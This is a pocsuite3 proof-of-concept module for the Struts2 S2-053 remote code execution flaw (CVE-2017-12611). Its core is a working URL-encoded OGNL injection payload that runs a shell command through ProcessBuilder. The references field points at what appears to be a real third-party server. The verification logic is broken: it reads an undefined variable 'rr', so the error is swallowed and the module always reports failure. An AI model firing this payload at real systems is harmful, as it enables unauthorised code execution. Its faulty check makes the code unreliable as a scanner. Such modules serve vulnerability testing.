# -*- coding:utf-8 -*-

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from urllib.parse import urljoin
from pocsuite3.lib.utils import random_str


class DemoPOC(POCBase):
    vulID = "CVE-2017-12611"
    version ='1'
    author = ["LMX"]
    vulDate = "2017-09-07"
    createDate = "2022-2-2"
    updateDate = "2022-2-2"
    references =["http://5.249.156.94:8080/etrackweb/loginAction.action"]
    name ="S2-053 Remote Code Execution Vulnerablity"
    appPowerLink = ''
    appName = 'Strute2'
    appVersion = '2.0.1-2.3.33, 2.5-2.5.10'
    vulType = 'RCE'
    desc = '''
    struts2-053远程代码执行漏洞
    '''

    def _verify(self):
        result ={}
        payload = '''redirectUri=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmds%3D%28%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%27id%27%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D%0A'''
        headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Cookie':'SessionId=96F3F15432E0660E0654B1CE240C4C36'
                    }
        url = self.url
        r = requests.post(url=url,headers=headers,data=payload)
        try:
            if 'uid=' in rr.text or 'uid%3D' in rr.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except Exception as e:
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        return self._verify()
register_poc(DemoPOC) 
